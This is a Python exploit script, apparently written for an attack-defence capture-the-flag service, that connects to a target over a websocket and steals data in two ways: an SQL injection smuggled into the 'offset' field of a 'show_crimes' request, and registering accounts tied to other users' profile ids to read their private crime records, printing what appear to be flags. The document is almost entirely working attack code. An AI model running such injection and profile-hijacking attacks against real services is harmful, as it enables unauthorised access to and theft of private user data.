#!/usr/bin/env python3
# coding=utf-8
from json import dumps, loads
from random import randrange

from socket import gaierror
from sys import stderr, argv
from websocket import create_connection

__author__ = 'm_messiah'


def close(s):
    print(s, file=stderr)
    exit(1)


class Client(object):
    def __init__(self, sock):
        self.username = self.password = None
        self.ws = sock
        self.sploit = [self.sploit_sql, self.sploit_profile]

    def register(self, username, password, profile=None):
        """Registration"""
        self.username = username
        self.password = password
        self.ws.send(dumps(
            {'action': 'register',
             'params': {'username': self.username,
                        'password': self.password,
                        'profile': profile}}))
        answer = loads(self.ws.recv())
        if "successful" not in answer["text"]:
            close("registration failed: %s" % answer)
        return answer

    def auth(self, username=None, password=None):
        """Authentication"""
        if username:
            self.username = username
            self.password = password
        self.ws.send(dumps(
            {'action': 'auth',
             'params': {'username': self.username,
                        'password': self.password}}))
        answer = loads(self.ws.recv())
        if "Welcome" not in answer["text"]:
            close("authentication failed: %s" % answer)

        if "text" not in answer and "Welcome" not in answer["text"]:
            if "id" not in answer:
                close("authentication failed: %s" % answer)
            else:
                _ = self.ws.recv()
        if "rows" not in answer:
            answer = loads(self.ws.recv())
        # Show Profiles
        if ("data" not in answer["rows"][0] or
                len(answer["rows"][0]["data"]) < 5):
            close("showProfile failed: %s" % answer)
        return answer

    def sploit_sql(self):
        username, password = '%x' % randrange(16**15), '%x' % randrange(16**15)
        self.register(username, password)
        self.auth(username, password)
        self.ws.send(dumps(
            {'action': 'show_crimes',
             'params': {'offset': "0; select crimeid, name, description, "
                                  "city, country, crimedate, public "
                                  "from crimes LIMIT 10 --"}}))
        answer = loads(self.ws.recv())
        if ("rows" in answer and
                "data" in answer['rows'][0]):
            crimes = answer['rows'][0]['data']
            print(len(crimes))
            for crime in crimes:
                print(crime['article'].split()[-1])
        else:
            print(answer, file=stderr)

    def sploit_profile(self):
        username, password = '%x' % randrange(16**15), '%x' % randrange(16**15)
        self.register(username, password)
        self.auth(username, password)
        for offset in range(5):
            self.ws.send(dumps({'action': 'show_crimes',
                                'params': {'offset': offset}}))
            answer = loads(self.ws.recv())
            if "rows" not in answer or "data" not in answer["rows"][0]:
                return

            crimes = list(filter(lambda cr: cr['public'] == "fa-lock",
                                 answer["rows"][0]["data"]))
            for crime in crimes:
                self.ws.send(dumps({
                    'action': 'show_crime',
                    'params': {'crimeid': crime["crimeid"]}}))
                answer = loads(self.ws.recv())
                last_participant = answer['text'].split(" or ")[-1].strip()
                if not last_participant:
                    continue

                self.ws.send(dumps({
                    'action': 'search',
                    'params': {
                        'text': last_participant.replace(".&nbsp;", " ")
                    }
                }))
                answer = loads(self.ws.recv())
                if ('rows' not in answer or "data" not in answer['rows'][0] or
                        'profileid' not in answer['rows'][0]['data'][0]):
                    continue
                for profile in answer['rows'][0]['data']:
                    self.register('%x' % randrange(16**15),
                                  '%x' % randrange(16**15),
                                  profile['profileid'])
                    self.auth()
                    self.ws.send(dumps({'action': 'show_my_profile'}))
                    answer = loads(self.ws.recv())
                    if ('rows' in answer and 'cols' in answer['rows'][0] and
                            'rows' in answer['rows'][0]['cols'][1] and
                            len(answer['rows'][0]['cols'][1]['rows'])):
                        crs = answer['rows'][0]['cols'][1]['rows'][1]
                        if 'hidden' in crs and not crs['hidden'] and 'data' in crs:
                            cr = answer['rows'][0]['cols'][1]['rows'][1]['data']
                            for my_cr in cr:
                                print(my_cr['description'].split()[-1])


if __name__ == '__main__':
    answer = ""
    if len(argv) < 3:
        close("Usage: %s <sploit_num> <address>\n"
              "where <sploit_num>:\n"
              "0 - sql injection in show_crimes\n"
              "1 - register with participant profile\n"
              "2 - search by author id to determine username (not implemented)"
              "* - len(username) = admin\n"
              "* - get participant profile, "
              "using known private info (from your db)\n"
              "* - get crimes description from your profile "
              "right after someone get opens participant profile\n"
              "" % argv[0])
    try:
        ws = create_connection("ws://%s:1984/websocket" % argv[2])
        ws.send(dumps({"action": "hello"}))
        answer = loads(ws.recv())
        if answer['rows'][0]['view'] != "form":
            raise KeyError
        c = Client(ws)
        # Magic
        c.sploit[int(argv[1])]()

    except gaierror:
        close("No connection to %s" % argv[1])
    except (KeyError, IndexError):
        close("JSON structure\nBad answer in %s" % answer)
